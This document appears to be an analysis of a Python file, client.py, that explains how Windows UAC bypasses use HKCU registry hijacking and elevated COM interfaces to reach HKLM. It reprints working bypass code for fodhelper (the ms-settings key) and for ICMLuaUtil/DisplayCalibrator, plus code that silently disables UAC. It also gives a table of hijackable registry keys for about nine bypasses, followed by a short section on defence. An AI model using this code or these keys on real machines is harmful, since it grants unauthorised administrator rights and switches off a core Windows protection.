# Registry Exploit Analysis - HKLM vs HKCU

## üîç Can UAC Bypasses Write to HKLM Without Admin?

**SHORT ANSWER:** ‚ùå **NO** - Most UAC bypasses **CANNOT** directly write to HKLM without admin.

**HOW THEY WORK:** They write to **HKCU** (which doesn't need admin), then trick **auto-elevated processes** into running their payload with admin privileges.

---

## üìã Registry Hive Permissions

### **HKEY_CURRENT_USER (HKCU)**
- ‚úÖ **Any user can write** - No admin needed
- üîí Affects **only the current user**
- üìç Stored in: `C:\Users\<username>\NTUSER.DAT`
- üí° Perfect for UAC bypass because it doesn't trigger UAC prompts

### **HKEY_LOCAL_MACHINE (HKLM)**
- ‚ùå **Requires admin** to write (with exceptions)
- üåê Affects **all users** on the system
- üìç Stored in: `C:\Windows\System32\config\`
- üîí Protected by UAC and system permissions

---

## üéØ UAC Bypass Methods - Registry Analysis

### **Method Category 1: HKCU Hijacking** ‚úÖ (Most Common)

All these methods write to **HKCU** (no admin needed), then exploit auto-elevated processes:

| UAC Bypass | Registry Key Written (HKCU) | Admin Needed? |
|------------|----------------------------|---------------|
| **Fodhelper** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` | ‚ùå NO |
| **ComputerDefaults** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` | ‚ùå NO |
| **EventVwr** | `HKCU\Software\Classes\mscfile\shell\open\command` | ‚ùå NO |
| **Sdclt** | `HKCU\Software\Classes\Folder\shell\open\command` | ‚ùå NO |
| **WSReset** | `HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command` | ‚ùå NO |
| **Slui** | `HKCU\Software\Classes\exefile\shell\open\command` | ‚ùå NO |
| **Winsat** | `HKCU\Software\Classes\Folder\shell\open\command` | ‚ùå NO |
| **SilentCleanup** | `HKCU\Environment` (windir variable) | ‚ùå NO |
| **COM Handlers** | `HKCU\Software\Classes\CLSID\{...}` | ‚ùå NO |

**How It Works:**

```
1. Attacker writes to HKCU (‚úÖ allowed, no admin)
   Example: HKCU\Software\Classes\ms-settings\Shell\Open\command = "malware.exe"

2. Attacker launches auto-elevated process
   Example: fodhelper.exe (auto-elevates to admin)

3. Auto-elevated process checks registry
   Windows looks in: HKCU first, then HKLM
   Finds: HKCU\Software\Classes\ms-settings\Shell\Open\command

4. Executes malware with ADMIN privileges!
   fodhelper.exe runs malware.exe as admin
```

**Key Point:** 
- ‚úÖ Can write to HKCU without admin
- ‚ùå Cannot write to HKLM without admin
- üí° But the **hijacked process** runs as admin and can then write to HKLM

---

### **Method Category 2: HKCU "Fake" Auto-Elevation** ‚ö†Ô∏è

**Function:** `elevate_via_registry_auto_approve()` (Line 2085)

**Code:**
```python
def elevate_via_registry_auto_approve():
    """Automatically approve UAC prompts via registry modification."""
    
    # Set UAC to auto-approve for current user (no prompt)
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    
    # Try to set in HKCU first (doesn't need admin)
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        log_message("[REGISTRY] Auto-approve set in HKCU")
        return True
    except Exception:
        pass
```

**Registry Keys:**
- ‚úÖ Writes to: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
- ‚ùå Does NOT write to: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

**Does It Work?** ‚ùå **NO - This is MISLEADING!**

**Why It Doesn't Work:**
- UAC reads settings from **HKLM**, not HKCU
- HKCU values for UAC are **ignored** by Windows
- This method is **ineffective** - it's likely just there to confuse or as a failed attempt

**Real UAC Settings Location (requires admin):**
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
‚îú‚îÄ‚îÄ EnableLUA (must write to HKLM to actually disable UAC)
‚îú‚îÄ‚îÄ ConsentPromptBehaviorAdmin (must write to HKLM)
‚îî‚îÄ‚îÄ PromptOnSecureDesktop (must write to HKLM)
```

---

### **Method Category 3: COM Interface Abuse** üî¥ (HKLM Access)

**Method:** ICMLuaUtil COM Interface (Method 41)

**Function:** `bypass_uac_dccw_com()` (Line 2310)

**Code:**
```python
def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    
    try:
        # First use ICMLuaUtil to set registry
        lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
        
        current_exe = os.path.abspath(__file__)
        
        # Set DisplayCalibrator registry value
        reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
        lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
        
        # Create IColorDataProxy COM object
        color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
```

**Registry Key:**
- üî¥ Writes to: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration`
- üî¥ Admin needed? **Technically YES, but bypassed via COM**

**How It Works:**

```
1. Abuse ICMLuaUtil COM interface
   CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
   This COM object has auto-elevation privilege

2. Call SetRegistryStringValue() method
   Writes to HKLM through the elevated COM interface

3. Abuse IColorDataProxy COM interface
   CLSID: {D2E7041B-2927-42FB-8E9F-7CE93B6DC937}
   Triggers execution of the hijacked path
```

**Is This "Without Admin"?** ‚ö†Ô∏è **Technically NO, but...**
- You're **not admin**, but the **COM interface is**
- You're **abusing** a privileged COM interface
- The COM object **has admin rights** and writes to HKLM on your behalf
- This is an **elevation of privilege exploit**, not "no admin needed"

**Patched?** ‚úÖ This exploit has been patched in modern Windows versions

---

### **Method Category 4: Bootstrap Methods** üîÑ

**Function:** `bootstrap_uac_disable_no_admin()` (Line 5127)

**Claim:** 
```python
"""
BOOTSTRAP METHOD: Disable UAC WITHOUT needing admin privileges!

Strategy:
1. Use UAC bypass techniques (fodhelper, eventvwr, etc.) to gain admin
2. The elevated process then disables UAC permanently
3. All happens automatically with ZERO password prompts!

This works from a STANDARD USER account!
"""
```

**What It Actually Does:**

1. **Uses HKCU UAC bypasses** (fodhelper, eventvwr, etc.)
   - Writes to `HKCU\Software\Classes\...`
   
2. **Launches auto-elevated process**
   - Process runs with admin privileges
   
3. **Elevated process writes to HKLM**
   - NOW it can write to HKLM because it's running as admin
   - Disables UAC in `HKLM\SOFTWARE\...\Policies\System`

**Summary:**
- ‚ùå **Does NOT write to HKLM without admin**
- ‚úÖ **Gets admin first** (via UAC bypass)
- ‚úÖ **THEN writes to HKLM** (with the admin privileges it just gained)

---

## üìä Summary Table

| Method | Can Write HKCU? | Can Write HKLM Without Admin? | How It Actually Works |
|--------|----------------|-------------------------------|----------------------|
| **Fodhelper/EventVwr/Sdclt/etc.** | ‚úÖ YES | ‚ùå NO | Writes HKCU, hijacks auto-elevated process |
| **elevate_via_registry_auto_approve()** | ‚úÖ YES | ‚ùå NO | Writes HKCU (but ineffective) |
| **ICMLuaUtil COM** | ‚úÖ YES | üî¥ YES (via COM) | Abuses privileged COM interface |
| **Bootstrap Methods** | ‚úÖ YES | ‚ùå NO (gets admin first) | UAC bypass ‚Üí get admin ‚Üí write HKLM |
| **silent_disable_uac()** | ‚úÖ YES | ‚ùå NO (requires admin) | Direct HKLM write (needs admin) |

---

## üî¨ Technical Deep Dive

### **Why HKCU Bypasses Work:**

**Windows Registry Lookup Order:**
When a process looks for a registry key, Windows checks:

```
1. HKEY_CURRENT_USER\Software\Classes  (per-user settings)
2. HKEY_LOCAL_MACHINE\Software\Classes (system-wide settings)
```

**Exploit:**
- Attacker creates key in **HKCU** (step 1)
- Auto-elevated process checks **HKCU first**
- Finds attacker's malicious key
- Executes with admin privileges

**Example - Fodhelper.exe:**

```
Normal behavior:
  fodhelper.exe launches
  ‚Üí Checks HKLM\Software\Classes\ms-settings\Shell\Open\command
  ‚Üí Executes default handler

Exploited behavior:
  Attacker: Creates HKCU\Software\Classes\ms-settings\Shell\Open\command = "malware.exe"
  fodhelper.exe launches (auto-elevated to admin)
  ‚Üí Checks HKCU FIRST
  ‚Üí Finds attacker's key: "malware.exe"
  ‚Üí Executes malware.exe WITH ADMIN PRIVILEGES!
```

---

## üõ°Ô∏è Why These Are Exploits (Not "Features")

### **1. They Don't Actually Write to HKLM Without Admin**

Most bypasses:
- ‚úÖ Write to **HKCU** (allowed)
- ‚ùå **Cannot** write to HKLM directly
- üí° Trick **another process** (that has admin) to run their code

### **2. The Exception: COM Interface Abuse**

ICMLuaUtil:
- üî¥ **Abuses** a privileged COM interface
- üî¥ The **COM object** has admin, not the user
- üî¥ This is **elevation of privilege** - a security vulnerability
- ‚úÖ **Patched** in modern Windows

### **3. Bootstrap Methods Get Admin First**

- Step 1: UAC bypass to gain admin
- Step 2: NOW write to HKLM (because you're admin)
- Not "writing to HKLM without admin" - it's "get admin, then write"

---

## üîç Code Examples from client.py

### **Example 1: Fodhelper (HKCU Only)**

```python
def bypass_uac_fodhelper_protocol():
    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
    
    current_exe = os.path.abspath(__file__)
    key_path = r"Software\Classes\ms-settings\Shell\Open\command"
    
    # ‚úÖ Writes to HKCU (no admin needed)
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.CloseKey(key)
    
    # Execute fodhelper to trigger bypass
    fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
    subprocess.Popen([fodhelper_path], creationflags=subprocess.CREATE_NO_WINDOW)
```

**Result:**
- Writes: `HKCU\Software\Classes\ms-settings\Shell\Open\command` ‚úÖ
- Does NOT write: `HKLM` ‚ùå
- Fodhelper.exe runs with admin and executes the hijacked command ‚úÖ

---

### **Example 2: ICMLuaUtil (HKLM via COM)**

```python
def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    
    # Create elevated COM object (CLSID for ICMLuaUtil)
    lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
    
    # üî¥ Writes to HKLM via privileged COM interface
    reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
    lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
```

**Result:**
- Writes: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration` üî¥
- How: Via privileged COM interface (not direct HKLM write)
- This is: **Elevation of privilege exploit** (patched in modern Windows)

---

### **Example 3: Silent UAC Disable (Requires Admin)**

```python
def silent_disable_uac_method1():
    """Method 1: Direct registry modification (Python winreg)."""
    
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    
    # ‚ùå This REQUIRES admin privileges to write
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
```

**Result:**
- Writes: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` ‚ùå
- Requires: **Admin privileges** ‚ùå
- Will fail: If not running as admin ‚ùå

---

## üéØ The REAL Question: Can You Disable UAC Without Admin?

### **Answer: NO (directly), but YES (via exploit)**

**Direct Method (Fails):**
```python
# ‚ùå This will fail without admin
winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ..., winreg.KEY_SET_VALUE)
# Error: Access denied (requires admin)
```

**Exploit Method (Works via bypass):**
```python
# ‚úÖ Step 1: Write to HKCU (allowed)
winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")

# ‚úÖ Step 2: Launch fodhelper.exe (auto-elevated)
subprocess.Popen([fodhelper_path])

# ‚úÖ Step 3: Fodhelper runs YOUR code as admin
# ‚úÖ Step 4: NOW your code can write to HKLM
```

**Flow:**
```
Standard User (no admin)
    ‚Üì
Write malicious key to HKCU (allowed)
    ‚Üì
Launch auto-elevated process (fodhelper.exe)
    ‚Üì
Auto-elevated process runs as ADMIN
    ‚Üì
Process executes YOUR code with ADMIN privileges
    ‚Üì
Your code NOW can write to HKLM
    ‚Üì
UAC disabled in HKLM ‚úÖ
```

---

## üö© Key Findings

### **1. No Direct HKLM Write Without Admin**
- ‚ùå You **cannot** write to HKLM without admin privileges
- ‚úÖ You **can** write to HKCU without admin
- üí° Exception: COM interface abuse (ICMLuaUtil) - but that's an exploit

### **2. UAC Bypasses Use HKCU Hijacking**
- All registry-based bypasses write to **HKCU**
- They exploit Windows **registry lookup order** (HKCU checked first)
- Auto-elevated processes find hijacked keys in HKCU
- Execute malicious code with admin privileges

### **3. "Without Admin" is Misleading**
- Bootstrap methods claim "no admin needed"
- Reality: They **get admin first** (via bypass), **then** modify HKLM
- It's not "without admin" - it's "get admin via exploit, then use it"

### **4. Only One Method Writes HKLM "Directly"**
- **ICMLuaUtil COM interface** (Method 41/43)
- Uses privileged COM object to write HKLM
- This is an **elevation of privilege vulnerability**
- **Patched** in modern Windows versions

---

## üõ°Ô∏è Defense

### **Prevent HKCU Hijacking:**

1. **Keep Windows Updated**
   - Microsoft patches auto-elevation exploits regularly
   - Many bypasses (fodhelper, eventvwr) have been patched

2. **Disable Auto-Elevation for Specific Binaries**
   - Remove auto-elevation flag from vulnerable binaries
   - Use Group Policy to restrict execution

3. **Monitor HKCU Changes**
   - Watch for suspicious registry modifications in:
     - `HKCU\Software\Classes\ms-settings`
     - `HKCU\Software\Classes\mscfile`
     - `HKCU\Software\Classes\Folder`
     - `HKCU\Software\Classes\exefile`

4. **Application Whitelisting**
   - Use Windows Defender Application Control (WDAC)
   - Only allow approved applications to run

5. **Least Privilege**
   - Don't run as admin for daily tasks
   - UAC bypasses require user to launch them first

---

## üìù Summary

**Question:** Which UAC bypass can add HKLM registry without admin?

**Answer:**

1. **None directly** - All require either:
   - Getting admin first (via bypass)
   - Abusing privileged COM interface (exploit)

2. **HKCU is the key:**
   - All bypasses write to **HKCU** (no admin needed)
   - Hijack auto-elevated processes
   - Process runs code as admin
   - **Then** the elevated code can write HKLM

3. **Exception (patched):**
   - ICMLuaUtil COM abuse
   - Writes HKLM via privileged COM interface
   - Not truly "without admin" - COM object has admin
   - Patched in modern Windows

4. **Bootstrap methods are misleading:**
   - Claim "no admin needed to disable UAC"
   - Actually: Get admin via bypass ‚Üí Then disable UAC
   - Not "without admin" - it's "get admin first"

**The truth:** You **cannot** write to HKLM without admin privileges. UAC bypasses **get admin** (via exploits), **then** write to HKLM.

---

**Document created:** 2025-10-15  
**Analysis of:** client.py UAC bypass registry operations

